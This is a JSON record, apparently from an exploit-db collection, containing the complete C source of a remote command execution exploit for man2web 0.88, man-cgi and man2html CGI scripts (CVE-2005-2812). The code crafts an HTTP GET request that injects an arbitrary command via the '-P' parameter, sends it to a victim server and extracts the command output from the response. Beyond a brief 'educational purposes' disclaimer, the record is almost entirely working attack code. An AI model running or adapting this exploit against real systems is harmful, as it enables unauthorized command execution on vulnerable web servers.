{
  "id": "1194",
  "title": "man2web 0.88 - Multiple Remote Command Executions (2)",
  "cve": "CVE-2005-2812",
  "vuln_type": "unknown",
  "code": "/*\r\n * str0ke@server:~$ ./test some.edu \"w\" /cgi-bin/man2web 80 1\r\n * /str0ke\r\n */\r\n \r\n /* dl-mancgi.c v0.2\r\n  * x86/linux multipie man2web cgi-scripts remote command spawn\r\n  * found and coded by tracewar\t(darklogic team)\t\t \r\n  * for educaional purposes only.                                  \r\n  *****************************************************************\t\r\n  * greetz goes to:\t\t\t\t\t\t\r\n  * matan peretz, ofer shaked, setuid, alex, majestic \r\n  */\r\n \r\n \r\n #include <stdio.h>\r\n #include <sys/types.h>\r\n #include <sys/socket.h>\r\n #include <netinet/in.h>\r\n #include <netdb.h>\r\n \r\n void usage(char *argv0) {\r\n         fprintf(stderr, \"x86/linux multipie man2web cgi-scripts remote command spawn\\n\");\r\n \tfprintf(stderr, \"researched by tracewar\\n\");\r\n \tfprintf(stderr, \"targets: \\n0=man-cgi\\n1=man2web\\n2=man2html\\n\\n\");\r\n \tfprintf(stderr, \"usage: %s <remote_host> <command> <path> <http server port> <target>\\n\", argv0);\r\n         fprintf(stderr, \"example:\");\r\n \tfprintf(stderr, \" %s 1.2.3.4 w /cgi-bin/man-cgi 80 0\\n\",argv0);\r\n         exit(0);\r\n }\r\n \r\n int main(int argc, char **argv) {\r\n         int sock, i, j, len = 0;\r\n         struct sockaddr_in serv_addr;\r\n         struct hostent *crap;\r\n \tchar *cp, dummy[50000], buffer[2000] = \"GET \";\t\r\n         if(argc < 6)\r\n            usage(argv[0]);\r\n \tif(atoi(argv[5]) == 0) {\r\n \t\t\tmemset(dummy, 0x00, 50000);\r\n \t\t\tstrcat(dummy, argv[3]);\r\n \t\t\tstrcat(dummy, \"?-P \");\r\n \t\t\tstrcat(dummy, argv[2]);\r\n \t\t\tstrcat(dummy, \" ls\");} \r\n \telse if(atoi(argv[5]) == 1) {\r\n               \t\tmemset(dummy, 0x00, 50000);\r\n              \t\tstrcat(dummy, argv[3]);\r\n             \t \tstrcat(dummy, \"?program=-P \");\r\n            \t        strcat(dummy, argv[2]);\r\n            \t        strcat(dummy, \" ls\");}\r\n \telse if(atoi(argv[5]) == 2) {\r\n \t\t\tmemset(dummy, 0x00, 50000);\r\n \t\t\tstrcat(dummy, argv[3]);\r\n \t\t\tstrcat(dummy, \"?section=-P\");\r\n \t\t\tstrcat(dummy, argv[2]);\r\n \t\t\tstrcat(dummy, \"&topic=w\");}\r\n \telse\r\n \t\tusage(argv[0]);\r\n \r\n \tprintf(\"# crafting buffer string ... \");\r\n          for(i=0, j=4;i < strlen(dummy);i++) {\r\n \t\tif(dummy[i] == ' ') {\r\n \t\t\tstrcat(buffer, \"%20\");\r\n \t\t\tj+=3;}\r\n \t\telse {\r\n \t\t\tbuffer[j] = dummy[i];\r\n \t\t\tj++;}\r\n \t}\r\n         \r\n \tstrcat(buffer, \"\\r\\n\");\r\n         printf(\"(done)\\n\");\r\n         sock = socket(AF_INET, SOCK_STREAM, 0);\r\n         if(sock < 0)\r\n                 return printf(\"# error creating socket.\\n\");\r\n         crap = gethostbyname(argv[1]);\r\n         if(crap == NULL)\r\n                 return printf(\"# cant resolve the specified hostname: %s\\n\", argv[1]);\r\n         else\r\n                 printf(\"# connecting to victim... \");\r\n \r\n         serv_addr.sin_family = AF_INET;\r\n \tserv_addr.sin_port = htons(atoi(argv[4]));\r\n         bcopy((char *)crap->h_addr, (char *)&serv_addr.sin_addr.s_addr, crap->h_length);\r\n \r\n         if (connect(sock, &serv_addr, sizeof(serv_addr)) < 0)\r\n                 return printf(\"(error)\\n# check again %s:%d\\n\", argv[1], atoi(argv[3]));\r\n \r\n         printf(\"(done)\\n# sending crafted string... \");\r\n         if( (send(sock, buffer, strlen(buffer), 0)) == -1 )\r\n                 return printf(\"\\n# error while sending the crafted string.!\\n\");\r\n         printf(\"(done)\\n# waiting for our call ...\\n\");\r\n \tmemset(buffer, 0x00, 2000);\r\n \tmemset(dummy, 0x00, 50000);\r\n \tprintf(\"\\n\\n\");\r\n \twhile(recv(sock, buffer, 2000, 0) > 0)\r\n \t\tstrcat(dummy, buffer);\r\n \r\n \tcp = &dummy[0];\r\n \ti = 0; j = 0;\r\n \tlen = strlen(dummy);\r\n \r\n         if(atoi(argv[5]) == 0) {\r\n                 while(strncmp(cp, \"<hr>\", 4) && i < len) {\r\n                         cp++;\r\n                         i++;\r\n                 }\r\n                 cp+=4;\r\n                 while(strncmp(cp, \"<hr>\", 4) && strncmp(cp, \"<A\", 2) && j < len) {\r\n \t\t\tj++;\r\n                         cp++;\r\n \t\t}\r\n                 *cp = '\\0';\r\n                 cp = &dummy[0] + i + 4;\r\n         }\r\n \r\n         else if(atoi(argv[5]) == 1) {\r\n                 while(strncmp(cp, \"\\<pre\\>\", 5) && i < len) {\r\n                         cp++;\r\n                         i++;\r\n                 }\r\n                 cp+=4;\r\n                 while(strncmp(cp, \"pre\", 3) && j < len) {\r\n \t\t\tj++;\r\n                         cp++;\r\n \t\t}\r\n                 *cp = '\\0';\r\n                 cp = &dummy[0] + i + 6;\r\n         }\r\n \r\n         else if(atoi(argv[5]) == 2) {\r\n                 while(strncmp(cp, \"PRE\", 3) && i < len) {\r\n                         cp++;\r\n                         i++;\r\n                 }\r\n                 cp+=2;\r\n                 while(strncmp(cp, \"PRE\", 3) && j < len) {\r\n \t\t\tj++;\r\n                         cp++;\r\n \t\t}\r\n                 *cp = '\\0';\r\n                 cp = &dummy[0] + i + 2;\r\n         }\r\n \r\n \tif(*cp == '\\0')\r\n \t\treturn printf(\"# Bad response from the server.\\n\");\r\n \r\n         printf(\"%s\", cp);\r\n \tprintf(\"\\n\\n\");\r\n         close(sock);\r\n         return 0;\r\n }\r\n\r\n// milw0rm.com [2005-09-04]",
  "url": "https://www.exploit-db.com/exploits/1194"
}